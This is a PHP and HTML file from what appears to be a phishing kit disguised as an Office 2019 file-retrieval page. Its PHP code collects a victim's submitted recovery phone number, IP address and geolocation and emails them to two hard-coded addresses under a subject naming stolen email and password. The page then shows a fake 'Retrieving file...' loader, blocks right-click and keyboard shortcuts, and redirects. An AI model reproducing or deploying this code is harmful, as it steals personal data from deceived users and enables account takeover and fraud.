<?php
error_reporting(0);
if(isset($_POST["ph"]))
{
	
	
$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address
$geoplugin->locate();
function get_client_ip ()
{
    // Nothing to do without any reliable information
    if (!isset ($_SERVER['REMOTE_ADDR'])) {
        return NULL;
    }

    // Header that is used by the trusted proxy to refer to
    // the original IP
    $proxy_header = "HTTP_X_FORWARDED_FOR";

    // List of all the proxies that are known to handle 'proxy_header'
    // in known, safe manner
    $trusted_proxies = array ("94.74.81.174");

    if (in_array ($_SERVER['REMOTE_ADDR'], $trusted_proxies)) {

        // Get the IP address of the client behind trusted proxy
        if (array_key_exists ($proxy_header, $_SERVER)) {

            // Header can contain multiple IP-s of proxies that are passed through.
            // Only the IP added by the last proxy (last IP in the list) can be trusted.
            $client_ip = trim (end (explode (",", $_SERVER[$proxy_header])));

            // Validate just in case
            if (filter_var ($client_ip, FILTER_VALIDATE_IP)) {
                return $client_ip;
            } else {
                // Validation failed - beat the guy who configured the proxy or
                // the guy who created the trusted proxy list?
                // TODO: some error handling to notify about the need of punishment
            }
        }
    }

    // In all other cases, REMOTE_ADDR is the ONLY IP we can trust.
    return $_SERVER['REMOTE_ADDR'];
}

$ip = get_client_ip ();

/* if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} */
$message .= "---------------|Blessed Child|---------------\n";
$message .= "Recovery Phone: " . $_POST['ph'] . "\n"; 
$message .= "IP : " .$ip. "\n"; 
$message .= "--------------------------------------------\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";


//$subject = "Office 2019 - $geoplugin->countryName ";

$to = "luvnkias@protonmail.com, miamibabe4tresh@yahoo.com"; 

$hi = mail($to,"Office 2019 Email & Passwrd| - $ip | ".$geoplugin->countryName , $message);
//$hi = mail($to, $subject, $message);
}

?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link rel="shortcut icon" href="favi.ico" type="image/gif">

<meta http-equiv="REFRESH" content="10; ok.html">

<title>Loading..</title></head>
<script>
document.onkeydown = function (e) {
    e = e || window.event;
    if (e.ctrlKey) {
        var c = e.which || e.keyCode;
        switch (c) {
            default:
				alert('Secured');return false;
        }
    }
};
</script>

<body oncontextmenu="alert('Secured');return false;"><br><br>
<center>
<table><tbody><tr>

<td width="30"></td>

<td>

	<img src="loader.gif" width="50" height="50">
</td>



<td width="5"></td>



<td>
	
	<font face="verdana" size="3">
	<b>Retrieving file... </b>
	<br>
	<font size="2">one moment please!</font>
	</font>

</td>

</tr></tbody></table>



</center>
</body></html>